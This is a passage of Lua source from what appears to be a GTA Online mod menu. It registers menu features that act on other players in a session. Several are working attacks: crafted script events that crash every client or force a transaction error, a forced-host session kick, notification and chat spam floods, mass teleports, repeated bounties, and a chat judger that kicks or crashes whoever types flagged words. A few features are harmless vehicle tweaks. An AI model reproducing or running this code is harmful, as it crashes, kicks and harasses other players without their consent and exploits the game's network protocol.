						gameplay.shoot_single_bullet_between_coords(entity.get_entity_coords(Ped), entity.get_entity_coords(Ped) + v3(0, 0.0, 0.1), 0, 177293209, player.get_player_ped(pid), false, true, 100)
					end
					if not f.on then
						break
					end
				end
			end
			for i, Ped in pairs(peds) do
				weapon.remove_all_ped_weapons(Ped)
				set_combat_attributes(Ped, false, true)
				ped.clear_ped_tasks_immediately(Ped)
				entity.set_entity_as_no_longer_needed(Ped)
			end
		end)

	-- Teleport player & vehicle out of bounds
		menu.add_player_feature(language["Teleport player far away /;/player feature|_|"], "action", u.player_trolling_features, function(f, pid)
			teleport_player_and_vehicle_to_position(pid, v3(25000, 25000, 2400), player.player_id() ~= pid, true)
		end)

	-- teleport session
		u.teleport_session_to_me = menu.add_feature(language["Teleport session to current position /;/feature|_|"], "toggle", u.session_malicious.id, function(f)
			if u.teleport_session_to_waypoint.on then
				u.teleport_session_to_waypoint.on = false
				system.yield(5000)
			end
			local me = player.player_id()
			local pos = player.get_player_coords(me)
			local Ped = player.get_player_ped(me)
			while f.on do
				local pids = {}
				for pid = 0, 31 do
					if player.is_player_valid(pid) and get_distance_between(player.get_player_coords(pid), pos) > 40 and (not network.is_scid_friend(player.get_player_scid(pid)) or not setting["Exclude friends from attacks #malicious#"]) then
						pids[#pids + 1] = pid
					end
				end
				for pid = 1, #pids do
					table.sort(pids, function(a, b) return (get_distance_between(player.get_player_ped(a), Ped) < get_distance_between(player.get_player_ped(b), Ped)) end)
					teleport_player_and_vehicle_to_position(pids[1], pos, false, false, true, f)
					table.remove(pids, 1)
					if not f.on then
						break
					end
					system.yield(0)
				end
				system.yield(0)
			end
			if get_distance_between(player.get_player_coords(player.player_id()), pos) > 150 then
				if player.is_player_in_any_vehicle(me) then
					teleport(player.get_player_vehicle(me), pos)
				else
					teleport(Ped, pos) 
				end
			end
		end)

	-- teleport session to waypoint
		u.teleport_session_to_waypoint = menu.add_feature(language["Teleport session to waypoint /;/feature|_|"], "toggle", u.session_malicious.id, function(f)
			if ui.get_waypoint_coord().x > 14000 then
				msg(language["Please set a waypoint. /;/msg|_|"], 6, true)
				f.on = false
				return
			end
			if u.teleport_session_to_me.on then
				u.teleport_session_to_me.on = false
				system.yield(5000)
			end
			local me = player.player_id()
			local initial_pos = player.get_player_coords(me)
			local pos = ui.get_waypoint_coord()
			local pos = v3(pos.x, pos.y, 1000)
			local Ped = player.get_player_ped(me)
			while f.on do
				local pids = {}
				for pid = 0, 31 do
					if player.is_player_valid(pid) and get_distance_between(player.get_player_coords(pid), pos) > 150 and (not network.is_scid_friend(player.get_player_scid(pid)) or not setting["Exclude friends from attacks #malicious#"]) then
						pids[#pids + 1] = pid
					end
				end
				for pid = 1, #pids do
					table.sort(pids, function(a, b) return (get_distance_between(player.get_player_ped(a), Ped) < get_distance_between(player.get_player_ped(b), Ped)) end)
					teleport_player_and_vehicle_to_waypoint(pids[1], pos, false, false, true, f)
					table.remove(pids, 1)
					if not f.on then
						break
					end
					system.yield(0)
				end
				system.yield(0)
			end
			if get_distance_between(player.get_player_coords(player.player_id()), initial_pos) > 150 then
				if player.is_player_in_any_vehicle(me) then
					teleport(player.get_player_vehicle(me), initial_pos)
				else
					teleport(Ped, initial_pos) 
				end
			end
		end)

	-- Blocking areas
		local function block_area(f, angles, offsets, locations, object_model)
			if f.on then
				local me = player.player_id()
				local block_objects = {}
				for i, location in pairs(locations) do
					local offset = v3()
					if offsets[i] then
						offset = offsets[i]
					end
					local object = spawn_entity(gameplay.get_hash_key(object_model), location - v3(0, 0, 2) + offset)
					if object and entity.is_an_entity(object) then
						block_objects[#block_objects + 1] = object
						if angles[i] then
							entity.set_entity_heading(object, angles[i])
						end
					end
				end
				blocking_objects[#blocking_objects + 1] = block_objects
				while f.on do
					system.yield(100)
					if player.player_id() ~= me then
						f.on = false
					end
				end
				clear_entities(block_objects)
				table.remove(blocking_objects, table.get_index_of_value(blocking_objects, block_objects))
			end
		end

		menu.add_feature(language["Block all los santos customs /;/feature|_|"], "toggle", u.block_areas.id, function(f)
			local angles = {-135, 0, -40, -90, 70, 0}
			block_area(f, angles, {}, location_mapper.get_los_santos_customs_locations(), "v_ilev_cin_screen")
		end)

		menu.add_feature(language["Block all Ammu-Nations /;/feature|_|"], "toggle", u.block_areas.id, function(f)
			block_area(f, {}, {}, location_mapper.get_ammu_nation_locations(), "prop_air_monhut_03_cr")
		end)

		menu.add_feature(language["Block casino /;/feature|_|"], "toggle", u.block_areas.id, function(f)
			local offsets = 
				{
					v3(), 
					v3(-3, 4, 0), 
					v3(-2.5, 1.75, 0)
				}
			local angles = {55, -34, -32}
			block_area(f, angles, offsets, location_mapper.get_casino_locations(), "prop_sluicegater")
		end)

	-- Force host
		u.force_host = menu.add_feature(language["Get host /;/feature|_|"], "toggle", u.session_malicious.id, function(f)
			local me = player.player_id()
			while f.on and not network.network_is_host() and me == player.player_id() do
				system.yield(0)
				local nothing, friends = get_host(player.player_id())
				if friends then
					break
				end
			end
			f.on = false
		end)	

	-- Kick session
		menu.add_feature(language["Kick session /;/feature|_|"], "action", u.session_malicious.id, function()
			local me = player.player_id()
			local pid = script.get_host_of_this_script()
			local pos = player.get_player_coords(pid)
			send_script_event(-1975590661, pid, {pid, math.round(pos.x), math.round(pos.y), math.round(pos.z), 0, 0, 1000, 1}, true)
			local pid = get_random_player_except({pid, player.player_id()})
			send_script_event(3574926665, pid, {pid, 2147483647})
			if not network.network_is_host() then
				u.force_host.on = true
				system.yield(2000)
			end
			for pid = 0, 31 do
				if player.is_player_valid(pid) and pid ~= me and (not network.is_scid_friend(player.get_player_scid(pid)) or not setting["Exclude friends from attacks #malicious#"]) then
					kick(pid)
				end
			end
			for i = 1, 15 do
				if player.player_count() == 1 or network.network_is_host() then
					break
				end
				system.yield(1000)
			end
			u.force_host.on = false
		end)

		menu.add_feature(language["Crash session /;/feature|_|"], "action", u.session_malicious.id, function()
			local pid = script.get_host_of_this_script()
			local pos = player.get_player_coords(pid)
			send_script_event(-1975590661, pid, {pid, math.round(pos.x), math.round(pos.y), math.round(pos.z), 0, 0, 2147483647, 1}, true)
			for pid = 0, 31 do
				if player.is_player_valid(pid) then
					script_event_crash(pid)
				end
				system.yield(0)
			end
		end)

	-- Session scripts
		menu.add_feature(language["Give session bounty /;/feature|_|"], "action", u.session_script_stuff.id, function()
			for pid = 0, 31 do
				set_bounty(pid)
				system.yield(0)
			end
		end)

		toggle[#toggle + 1] = {"Never wanted", menu.add_feature(language["Never wanted /;/feature|_|"], "toggle", u.session_script_stuff.id, function(f)
			setting["Never wanted"] = true
			while f.on do
				for pid = 0, 31 do
					if player.get_player_wanted_level(pid) > 0 and not player.is_player_modder(pid, -1) then
						send_script_event(393068387, pid, {pid, script.get_global_i(1630317 + (1 + (595 * pid)) + 506)}, true)
					end
					system.yield(0)
				end
				system.yield(1000)
			end
			setting["Never wanted"] = false
		end)}

		toggle[#toggle + 1] = {"Off-the-radar", menu.add_feature(language["off the radar /;/feature|_|"], "toggle", u.session_script_stuff.id, function(f)
			setting["Off-the-radar"] = true
			for pid = 0, 31 do
				otr_table[player.get_player_scid(pid)] = utils.time_ms() + 154748364
			end
			while f.on do
				for pid = 0, 31 do
					if not globals.is_player_otr(pid) and not player.is_player_modder(pid, -1) then
						send_script_event(575518757, pid, {pid, utils.time() - 60, utils.time(), 1, 1, script.get_global_i(1630317 + (1 + (595 * pid)) + 506)}, true)
					end
					system.yield(0)
				end
				system.yield(200)
			end
			setting["Off-the-radar"] = false
		end)}

		toggle[#toggle + 1] = {"Reapply bounty automatically", menu.add_feature(language["Reapply bounty /;/feature|_|"], "toggle", u.session_script_stuff.id, function(f)
			setting["Reapply bounty automatically"] = true
			local bounty_time_set = {}
			while f.on do
				for pid = 0, 31 do
					if entity.is_entity_dead(player.get_player_ped(pid)) and (not bounty_time_set[player.get_player_scid(pid)] or utils.time_ms() > bounty_time_set[player.get_player_scid(pid)]) then
						if set_bounty(pid) then
							bounty_time_set[player.get_player_scid(pid)] = utils.time_ms() + 10000
						end
						system.yield(0)
					end
				end
				system.yield(300)
			end
			setting["Reapply bounty automatically"] = false
		end)}

		toggle[#toggle + 1] = {"10k CEO loop", menu.add_feature(language["Give 10k /;/feature|_|"], "toggle", u.session_script_stuff.id, function(f)
			setting["10k CEO loop"] = true
			while f.on do
				for pid = 0, 31 do
					if not player.is_player_modder(pid, -1) then
						send_script_event(-2029779863, pid, {pid, 10000, -1292453789, 1, script.get_global_i(1630317 + (1 + (pid * 595)) + 506), script.get_global_i(1652336 + 9), script.get_global_i(1652336 + 10)})
					end
					system.yield(0)
				end
				for i = 1, 31 do
					system.yield(1000)
					if not f.on then
						break 
					end
				end
				system.yield(0)
			end
			setting["10k CEO loop"] = false
		end)}

		toggle[#toggle + 1] = {"Block passive", menu.add_feature(language["Block passive /;/feature|_|"], "toggle", u.session_script_stuff.id, function(f, pid)
			if f.on then
				setting["Block passive"] = true
				for pid = 0, 31 do
					if not player.is_player_modder(pid, -1) then
						send_script_event(-909357184, pid, {pid, 1}, true)
					end
					system.yield(0)
				end
			else
				for pid = 0, 31 do
					if not player.is_player_modder(pid, -1) then
						send_script_event(-909357184, pid, {pid, 0}, true)
					end
				end
				setting["Block passive"] = false
			end
		end)}

		menu.add_feature(language["Send to random mission /;/feature|_|"], "action", u.session_script_stuff.id, function(f)
			for pid = 0, 31 do
				if not player.is_player_modder(pid, -1) then
					if math.random(1, 8) == 1 then
						send_script_event(-545396442, pid, {0}, true)
					else
						send_script_event(-545396442, pid, {0, math.random(1, 7)}, true)
					end
				end
			end
		end)

		menu.add_feature(language["Perico island /;/feature|_|"], "toggle", u.session_script_stuff.id, function(f)
			if f.on then
				for pid = 0, 31 do
					if not player.is_player_modder(pid, -1) then
						send_script_event(1300962917, pid, {pid, 1300962917, 0, 0}, true)
					end
				end
			else
				for pid = 0, 31 do
					if not player.is_player_modder(pid, -1) then
						send_script_event(-171207973, pid, {pid, pid, 1, 0, 1, 1, 1, 1}, true)
					end
				end
			end
		end)

		menu.add_feature(language["Apartment invites /;/feature|_|"], "toggle", u.session_script_stuff.id, function(f)
			while f.on do
				for pid = 0, 31 do
					if not player.is_player_modder(pid, -1) then
						send_script_event(-171207973, pid, {pid, pid, 1, 0, math.random(0, 114), 1, 1, 1}, true)
					end
					system.yield(0)
				end
				system.yield(5000)
			end
		end)

		menu.add_feature(language["Ban CEO /;/feature|_|"], "action", u.session_script_stuff.id, function()
			for pid = 0, 31 do
				if not player.is_player_modder(pid, -1) then
					send_script_event(-738295409, pid, {pid, 1}, true)
				end
			end
		end)

		menu.add_feature(language["Dismiss CEO /;/feature|_|"], "action", u.session_script_stuff.id, function()
			for pid = 0, 31 do
				if not player.is_player_modder(pid, -1) then
					send_script_event(-1648921703, pid, {pid, 1, 5}, true)
				end
			end
		end)

		menu.add_feature(language["Terminate CEO /;/feature|_|"], "action", u.session_script_stuff.id, function()
			for pid = 0, 31 do
				if not player.is_player_modder(pid, -1) then
					send_script_event(-1648921703, pid, {pid, 1, 6}, true)
				end
			end
		end)

		menu.add_feature(language["Notification spam /;/feature|_|"], "toggle", u.session_script_stuff.id, function(f)
			while f.on do
				system.yield(0)
				for pid = 0, 31 do
					send_script_event(891272013, pid, {pid, math.random(-2147483647, 2147483647)}, true)
					system.yield(0)
				end
			end
		end)

		menu.add_feature(language["Transaction error /;/feature|_|"], "toggle", u.session_script_stuff.id, function(f)
			while f.on do
				for pid = 0, 31 do
					if not player.is_player_modder(pid, -1) then
						send_script_event(1302185744, pid, {pid, 2147483647, 1, 1, script.get_global_i(1630317 + (1 + (pid * 595) + 506)), script.get_global_i(1652336 + 9), script.get_global_i(1652336 + 10), 1}, true)
					end
					system.yield(0)
				end
				system.yield(1000)
			end
		end)

	-- Custom chat judger
		-- Chat judge settings
			menu.add_player_feature(language["Chat judge this player /;/player feature|_|"], "toggle", u.player_chat_features, function(f, pid)
				if f.on then
					find_and_toggle_on_or_off_toggle("Custom chat judger", true)
					find_and_toggle_on_or_off_toggle("Judge selected only", true)
					selected_players_for_chat_judger[player.get_player_scid(pid)] = true
				else
					selected_players_for_chat_judger[player.get_player_scid(pid)] = nil
				end
			end)

			menu.add_feature(language["Add entry chat judger /;/feature|_|"], "action", u.custom_chat_judger.id, function()
				local text = get_input(language["Type in what to add. /;/input_does_not_support_unicode|_|"], "", 128, 0)
				if #text == 0 then
					msg(language["Entry is too short. /;/msg|_|"], 6, true)
					return
				end
				if not log("scripts\\kek_menu_stuff\\kekMenuData\\custom_chat_judge_data.txt", text, {text}, true) then
					msg(language["Added /;/msg|_|"].." "..text, 212, true)
					temp.update_chat_judge = true
				else
					msg(language["Entry is already in there! /;/msg|_|"], 210, true)
				end
			end)

			menu.add_feature(language["Remove entry chat judger /;/feature|_|"], "action", u.custom_chat_judger.id, function()
				local text = get_input(language["Type in what to remove. /;/input_does_not_support_unicode|_|"], "", 128, 0)
				if #text == 0 then
					msg(language["Entry is too short. /;/msg|_|"], 6, true)
					return
				end
				if modify_entry("scripts\\kek_menu_stuff\\kekMenuData\\custom_chat_judge_data.txt", {text}, true) == 1 then
					msg(language["Removed /;/msg|_|"].." "..text, 212, true)
					temp.update_chat_judge = true
				else 
					msg(language["Couldn't find entry. /;/msg|_|"], 6, true)
				end
			end)

			menu.add_feature(language["Empty chat judge file /;/feature|_|"], "action", u.custom_chat_judger.id, function()
				local file = io.open(o.kek_menu_stuff_path.."kekMenuData\\custom_chat_judge_data.txt", "w+")
				file:close()
				msg(language["Emptied. /;/msg|_|"], 140, true)
				temp.update_chat_judge = true
			end)

			valuei["Chat judge reaction"] = {"Chat judge reaction", menu.add_feature(language["What reaction, click me /;/feature|_|"], "autoaction_value_i", u.custom_chat_judger.id, function(f)
				setting["Chat judge reaction"] = f.value_i
				if controls.is_disabled_control_pressed(0, 215) then
					msg(language["0 = random(not kick / crash)\\n1 = Set bounty\\n2 = Ram player\\n3 = Kick from vehicle /;/msg|_|"], 140, true)
					msg(language["4 = Blame kill lobby\\n5 = Kick player\\n6 = Crash player /;/msg|_|"], 140, true)
				end
			end)}
			valuei["Chat judge reaction"][2].min_i, valuei["Chat judge reaction"][2].max_i, valuei["Chat judge reaction"][2].mod_i = 0, 6, 1

		-- Chat judge
			toggle[#toggle + 1] = {"Custom chat judger", menu.add_feature(language["Custom chat judge /;/feature|_|"], "toggle", u.custom_chat_judger.id, function(f)
				if f.on then
					setting["Custom chat judger"] = true
					local str = get_file_string("scripts\\kek_menu_stuff\\kekMenuData\\custom_chat_judge_data.txt", "*a")
					u.chat_judge_listener = event.add_event_listener("chat", function(p)
						if p.player == player.player_id() or (network.is_scid_friend(player.get_player_scid(p.player)) and setting["Exclude friends from attacks #malicious#"]) or (setting["Judge selected only"] and not selected_players_for_chat_judger[player.get_player_scid(p.player)]) then
							return 
						end
						if temp.update_chat_judge then
							str = get_file_string("scripts\\kek_menu_stuff\\kekMenuData\\custom_chat_judge_data.txt", "*a")
							temp.update_chat_judge = false
						end
						for chat_judge_entry in str:gmatch("([^\n]*)\n?") do
							random_wait(10)
							if p.body:lower() == chat_judge_entry:lower() then
								local chat_type = valuei["Chat judge reaction"][2].value_i
								if chat_type == 0 then
									chat_type = math.random(1, 4)
								end
								chat_judge_reactions(p.player, chat_type)
								break
							end
						end
					end)
				else
					setting["Custom chat judger"] = false
					event.remove_event_listener("chat", u.chat_judge_listener)
					u.chat_judge_listener = nil
				end
			end)}

			toggle[#toggle + 1] = {"Judge selected only", menu.add_feature(language["Judge only selected players /;/feature|_|"], "toggle", u.custom_chat_judger.id, function(f)
				if f.on then
					find_and_toggle_on_or_off_toggle("Custom chat judger", true)
					setting["Judge selected only"] = true
				else
					setting["Judge selected only"] = false
				end
			end)}

	-- Chat spammer
		valuei["Spam speed"] = {"Spam speed", menu.add_feature(language["Spam speed, click to type /;/feature|_|"], "autoaction_value_i", u.chat_spammer.id, function(f)
			if controls.is_disabled_control_pressed(0, 215) then
				local v = get_input(language["Type in ram speed /;/input_does_not_support_unicode|_|"], "", 7, 0, setting["Spam speed"])
				value_i_setup(f, v)
			end
			setting["Spam speed"] = f.value_i
		end)}
		valuei["Spam speed"][2].max_i, valuei["Spam speed"][2].min_i, valuei["Spam speed"][2].mod_i = 1000000, 30, 20

		u.text_spam_size = menu.add_feature(language["Text to spam, type it in /;/feature|_|"], "action_value_i", u.chat_spammer.id, function(f)
			local text = {""}
			for i = 1, f.value_i do
				local a, b, c = get_input(language["Type in part /;/input_does_not_support_unicode|_|"].." "..i.." "..language["of the text. All of these will be merged into one text. /;/input_does_not_support_unicode|_|"], "", 128, 0)
				text[1] = text[1].." "..a
				if c == 2 then
					msg(language["Cancelled. /;/msg|_|"], 212, true)
					return
				end
			end
			setting["Spam text"] = text[1]
		end)
		u.text_spam_size.max_i, u.text_spam_size.min_i, u.text_spam_size.value_i, u.text_spam_size.mod_i = 30, 1, 1, 1

		u.from_clipboard = menu.add_feature(language["Grab text from clipboard(what u copied) /;/feature|_|"], "toggle", u.chat_spammer.id, function(f)
			if f.on then
				u.text_from_file.on = false
				u.from_clipboard_and_line.on = false
				u.random_text_from_file.on = false
			end
		end)

		u.from_clipboard_and_line = menu.add_feature(language["Grab text from clipboard and send each line /;/feature|_|"], "toggle", u.chat_spammer.id, function(f)
			if f.on then
				u.text_from_file.on = false
				u.from_clipboard.on = false
				u.random_text_from_file.on = false
			end
		end)

		u.text_from_file = menu.add_feature(language["Grab text from file /;/feature|_|"], "toggle", u.chat_spammer.id, function(f)
			if f.on then
				u.from_clipboard.on = false
				u.from_clipboard_and_line.on = false
			else
				u.random_text_from_file.on = false
			end
		end)

		u.random_text_from_file = menu.add_feature(language["Random text from file /;/feature|_|"], "toggle", u.chat_spammer.id, function(f)
			if f.on then
				u.text_from_file.on = true
				u.from_clipboard.on = false
				u.from_clipboard_and_line.on = false
			end
		end)

		menu.add_feature(language["Chat spammer /;/feature|_|"], "toggle", u.chat_spammer.id, function(f)
			local function WAIT()
				local v = valuei["Spam speed"][2].value_i / 10
				for i = 1, v do
					if not f.on or valuei["Spam speed"][2].value_i / 10 ~= v then 
						break
					end
					system.yield(0)
				end
			end
			local str = get_file_string("scripts\\kek_menu_stuff\\kekMenuData\\Spam text.txt", "*a")
			local temp_str = str:gsub("\n", "")
			local number_of_entries = math.max(#str - #temp_str, 1)
			local which_line = 0
			local line_count = 1
			local which_line_to_grab_from_spam_text_file = math.random(1, number_of_entries)
			temp_str = nil
			while f.on do
				system.yield(0)
				if u.text_from_file.on then
					if not u.random_text_from_file.on then
						line_count = 1
						which_line = 0
					end
					for chat_spam_file_entry in str:gmatch("([^\n]*)\n?") do
						which_line = which_line + 1
						if not f.on or not u.text_from_file.on then
							break
						end
						if u.random_text_from_file.on and which_line == which_line_to_grab_from_spam_text_file then
							network.send_chat_message(chat_spam_file_entry, false)
							which_line_to_grab_from_spam_text_file = math.random(1, number_of_entries)
							which_line = 0
							WAIT()
							break
						elseif not u.random_text_from_file.on and which_line == line_count then
							network.send_chat_message(chat_spam_file_entry, false)
							WAIT()
							line_count = line_count + 1
						end
						random_wait(25)
					end
				else
					if u.from_clipboard.on and utils.from_clipboard() then
						setting["Spam text"] = utils.from_clipboard()
					end
					if u.from_clipboard_and_line.on then
						local str = utils.from_clipboard() 
						for chat_spam_file_entry in str:gmatch("([^\n]*)\n?") do
							network.send_chat_message(chat_spam_file_entry, false)
							WAIT()
							if not f.on or not u.from_clipboard_and_line.on or utils.from_clipboard() ~= str then
								break
							end
						end
					else
						network.send_chat_message(setting["Spam text"], false)
						WAIT()
					end
				end
			end
		end)

	-- Echo chat
		valuei["Echo delay"] = {"Echo delay", menu.add_feature(language["Echo delay, click to type /;/feature|_|"], "autoaction_value_i", u.chat_spammer.id, function(f)
			if controls.is_disabled_control_pressed(0, 215) then
				local v = get_input(language["Type in echo delay. /;/input_does_not_support_unicode|_|"], "", 7, 0, setting["Echo delay"])
				value_i_setup(f, v)
			end
			setting["Echo delay"] = f.value_i	
		end)}
		valuei["Echo delay"][2].max_i, valuei["Echo delay"][2].min_i, valuei["Echo delay"][2].mod_i = 1000000, 0, 25

		toggle[#toggle + 1] = {"Echo chat", menu.add_feature(language["Echo chat /;/feature|_|"], "toggle", u.chat_spammer.id, function(f)
			if f.on then
				setting["Echo chat"] = true
				u.echo_chat = event.add_event_listener("chat", function(chat)
					local rid = player.get_player_scid(chat.player)
					if player.player_id() ~= chat.player and (not setting["Individual echo"] or (setting["Individual echo"] and selected_players_for_echo_chat[rid])) and (not setting["Exclude friends from attacks #malicious#"] or not network.is_scid_friend(rid)) then
						for i = 1, setting["Echo delay"] / 10 do
							if not f.on or setting["Echo delay"] ~= valuei["Echo delay"][2].value_i then
								break
							end
							system.yield(0)
						end
						network.send_chat_message(chat.body, false)
					end
				end)
			else
				setting["Echo chat"] = false
				event.remove_event_listener("chat", u.echo_chat)
				u.echo_chat = nil
			end
		end)}

		toggle[#toggle + 1] = {"Individual echo", menu.add_feature(language["Echo selected players only /;/feature|_|"], "toggle", u.chat_spammer.id, function(f)
			if f.on then
				find_and_toggle_on_or_off_toggle("Echo chat", true)
				setting["Individual echo"] = true
			else
				setting["Individual echo"] = false
			end
		end)}

		menu.add_player_feature(language["Echo this player /;/player feature|_|"], "toggle", u.player_chat_features, function(f, pid)
			if f.on then
				find_and_toggle_on_or_off_toggle("Echo chat", true)
				find_and_toggle_on_or_off_toggle("Individual echo", true)
				selected_players_for_echo_chat[player.get_player_scid(pid)] = true
			else
				selected_players_for_echo_chat[player.get_player_scid(pid)] = nil
			end
		end)

	-- Chat bot
		menu.add_feature(language["Add entry to chat bot /;/feature|_|"], "action", u.chat_bot.id, function()
			local what_to_react_to = get_input(language["Type in what the bot will react to. /;/input_does_not_support_unicode|_|"], "", 128, 0)
			local reaction = get_input(language["Type in what the bot will say to what you previously typed in. /;/input_does_not_support_unicode|_|"], "", 128, 0)
			if #reaction > 0 and #what_to_react_to > 0 then
				if not log("\\scripts\\kek_menu_stuff\\kekMenuData\\Kek's chat bot.txt", "|"..what_to_react_to.."|&"..reaction.."&", {"|"..what_to_react_to.."|"}) then
					msg(language["Successfully added entry. /;/msg|_|"], 210, true)
					temp.update_chat_bot = true
				else
					msg(language["Entry was already added. /;/msg|_|"], 212, true)
				end
			else
				msg(language["Input too short. /;/msg|_|"], 6, true)
			end
		end)

		menu.add_feature(language["Remove entry from chat bot /;/feature|_|"], "action", u.chat_bot.id, function()
			local what_to_remove = get_input(language["Type in what the text the bot reacts to in the entry you wish to remove. /;/input_does_not_support_unicode|_|"], "", 128, 0)
			if modify_entry("scripts\\kek_menu_stuff\\kekMenuData\\Kek's chat bot.txt", {"|"..what_to_remove.."|"}) == 1 then
				msg(language["Removed entry. /;/msg|_|"], 212, true)
				temp.update_chat_bot = true
			else 
				msg(language["Couldn't find entry. /;/msg|_|"], 6, true)
			end
		end)

		menu.add_feature(language["Remove all entries from chatbot /;/feature|_|"], "action", u.chat_bot.id, function()
			local file = io.open(o.kek_menu_stuff_path.."kekMenuData\\Kek's chat bot.txt", "w+")
			file:flush()
			file:close()
			msg(language["Removed all entries. /;/msg|_|"], 212, true)
			temp.update_chat_bot = true
		end)

		valuei["chat bot delay"] = {"chat bot delay", menu.add_feature(language["Answer delay chatbot /;/feature|_|"], "autoaction_value_i", u.chat_bot.id, function(f)
			if controls.is_disabled_control_pressed(0, 215) then
				local v = get_input(language["Type in answer delay. /;/input_does_not_support_unicode|_|"], "", 7, 0, setting["chat bot delay"])
				value_i_setup(f, v)
			end
			setting["chat bot delay"] = f.value_i
		end)}
		valuei["chat bot delay"][2].max_i, valuei["chat bot delay"][2].min_i, valuei["chat bot delay"][2].mod_i = 1000000, 0, 20

		toggle[#toggle + 1] = {"chat bot", menu.add_feature(language["Chat bot /;/feature|_|"], "toggle", u.chat_bot.id, function(f)
			if f.on then
				local str = get_file_string("scripts\\kek_menu_stuff\\kekMenuData\\Kek's chat bot.txt", "*a")
				setting["chat bot"] = true
				u.kek_chat_bot_listener = event.add_event_listener("chat", function(info)
					if info.player ~= player.player_id() then
						system.yield(setting["chat bot delay"])
						if temp.update_chat_bot then
							str = get_file_string("scripts\\kek_menu_stuff\\kekMenuData\\Kek's chat bot.txt", "*a")
							temp.update_chat_bot = false
						end
						for chat_bot_entry in str:gmatch("([^\n]*)\n?") do
							if info.body == chat_bot_entry:match("|(.*)|") then
								network.send_chat_message(chat_bot_entry:match("&(.*)&"), false)
							end
						end
					end
				end)
			else
				setting["chat bot"] = false
				event.remove_event_listener("chat", u.kek_chat_bot_listener)
				u.kek_chat_bot_listener = nil
			end
		end)}

	-- Disconnect from session
		u.disconnect = menu.add_feature(language["Disconnect from session /;/feature|_|"], "action", u.session_malicious.id, function()
			if network.network_is_host() then
				network.network_session_kick_player(player.player_id())
				return
			end
			if player.player_count() > 10 then
				local str = {}
				for i = 1, 1000 do
					str[#str + 1] = "\nLMAO\nLMAO\nLMAO\nLMAO\nLMAO\nLMAO\nLMAO\nLMAO\nLMAO\nLMAO\nLMAO\nLMAO\n"
					random_wait(150)
				end
				str = table.concat(str, "")
				local time = utils.time_ms() + 6000
				while time > utils.time_ms() do
					network.send_chat_message(str, false)
					if player.player_count() == 0 then
						break
					end
					system.yield(0)
				end
				system.yield(2000) 
			end
			if player.player_count() > 0 then
				msg(language["Disconnect attempt failed. Attempting method 2... /;/msg|_|"], 6, true)
				msg(language["The game will freeze, just wait 10 seconds. /;/msg|_|"], 212, true)
				system.yield(2000)
				local time = utils.time_ms() + 8000
				while time > utils.time_ms() do
					local a = math.random()
				end
			end
		end)

-- Player peaceful
	-- Spawn a ped
		menu.add_player_feature(language["Type in ped model /;/player feature|_|"], "action", u.p_peds, function()
			txt.ped_text = get_input(language["Type in the name of the ped you want to spawn. /;/input_does_not_support_unicode|_|"], "", 128, 0, setting["Default pedestrian"])
		end)

		u.spawn_player_ped = menu.add_player_feature(language["Spawn a ped /;/player feature|_|"], "action_value_i", u.p_peds, function(f, pid)
			local count = 0
			for i = 1, f.value_i do
				system.yield(0)
				local peds = remove_player_entities(get_table_of_close_entity_type(2))
				local their_ped = player.get_player_ped(pid)
				if #peds > 95 then
					table.sort(peds, function(a, b) return (get_distance_between(a, get_ped_closest_to_your_pov()) < get_distance_between(b, get_ped_closest_to_your_pov())) end)
					for i = 1, #peds do
						clear_entities({peds[1]})
						table.remove(peds, 1)
						if #peds < 95 then
							break 
						end
					end
				end
				if math.ceil(i / 6) == i / 6 then
					count = count + 2.5
				end
				spawn_entity(pedestrian_mapper.get_animal_or_ped(txt.ped_text), get_vector_relative_to_entity(their_ped, 7 + count) + v3(math.random(-5, 5), math.random(-5, 5), 2 * (i / (count + 1))), 0, false, false, 4)
			end
		end)
		player_value_i_init(u.spawn_player_ped, 64, 1, 1, 1)

	-- Max my car
		menu.add_feature(language["Max car /;/feature|_|"], "action", u.vehicle_self.id, function()
			max_car(player.get_player_vehicle(player.player_id()))
		end)

	-- Max my car loop
		menu.add_feature(language["Max car loop /;/feature|_|"], "toggle", u.vehicle_self.id, function(f)
			while f.on do
				max_car(player.get_player_vehicle(player.player_id()))
				system.yield(500)
			end
		end)

	-- Give car godmode
		menu.add_player_feature(language["Car godmode /;/player feature|_|"], "toggle", u.player_vehicle_features, function(f, pid)
			while f.on do
				if player.get_player_vehicle(pid) ~= 0 and not entity.is_entity_dead(player.get_player_vehicle(pid)) and not entity.get_entity_god_mode(player.get_player_vehicle(pid)) then
					if modify_entity_godmode(player.get_player_vehicle(pid), true) then
						msg(language["Successfully gave /;/msg|_|"].." "..player.get_player_name(pid).."'s "..language["vehicle /;/msg|_|"].." "..language["godmode. /;/msg|_|"], 210, true)
					else
						msg(language["Failed to get control of /;/msg|_|"].." "..player.get_player_name(pid).."'s "..language["vehicle /;/msg|_|"]..".", 6, true)
						system.yield(1000)
					end
				end
				system.yield(500)
			end
			modify_entity_godmode(player.get_player_vehicle(pid), false)
		end)

	-- Give player vehicle fly
		menu.add_player_feature(language["Give player vehicle fly [horn toggles it] /;/player feature|_|"], "toggle", u.player_vehicle_features, function(f, pid)
			local is_using_vehicle_fly
			local their_ped = player.get_player_ped(pid)
			while f.on do
				system.yield(0)
				local car = player.get_player_vehicle(pid)
				if player.is_player_pressing_horn(pid) then
					while player.is_player_pressing_horn(pid) do
						system.yield(0)
					end
					if not is_using_vehicle_fly then
						is_using_vehicle_fly = true
					else
						is_using_vehicle_fly = false
					end
				end
				local is_in_vehicle = player.is_player_in_any_vehicle(pid)
				if is_using_vehicle_fly and is_in_vehicle then
					network.request_control_of_entity(car)
					entity.set_entity_max_speed(car, 45000)
					vehicle.set_vehicle_forward_speed(car, setting["Vehicle fly speed"])
				end
				if not is_in_vehicle then
					is_using_vehicle_fly = false 
				end
			end
		end)

	-- Copy their car 
		menu.add_player_feature(language["Copy player's car /;/player feature|_|"], "action", u.player_vehicle_features, function(f, pid)
			local me = player.player_id()
			local my_ped = player.get_player_ped(me)
			local pos = player.get_player_coords(me)
			local is_viable, personal_vehicle = is_target_viable(pid)
			if not is_viable and (not personal_vehicle or not entity.is_an_entity(personal_vehicle)) then
				msg(language["No vehicle to copy. /;/msg|_|"], 6, true)
				if player.is_player_in_any_vehicle(me) then
					entity.set_entity_coords_no_offset(player.get_player_vehicle(me), pos)
				else
					entity.set_entity_coords_no_offset(my_ped, pos)
				end
				return
			end
			temp.your_vehicle_entity_ids2 = player.get_player_vehicle(me)
			local veh
			if is_viable then
				veh = is_viable
			else
				veh = personal_vehicle
			end
			local hash = entity.get_entity_model_hash(veh)
			local car = spawn_entity(hash, get_vector_relative_to_entity(my_ped, 8), player.get_player_heading(me))
			max_car(car)
			vehicle.clear_vehicle_custom_primary_colour(car)
